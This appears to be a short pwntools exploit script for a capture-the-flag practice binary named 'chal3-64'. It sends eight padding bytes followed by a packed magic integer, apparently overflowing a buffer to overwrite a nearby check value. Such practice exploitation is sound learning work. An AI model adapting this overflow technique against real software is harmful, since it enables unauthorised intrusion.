from pwn import *

path = './chal3-64'

p = process(path)

print(p.recv().decode())
p.send(b'a'*8 + p32(1231234123))
print(p.recv().decode())
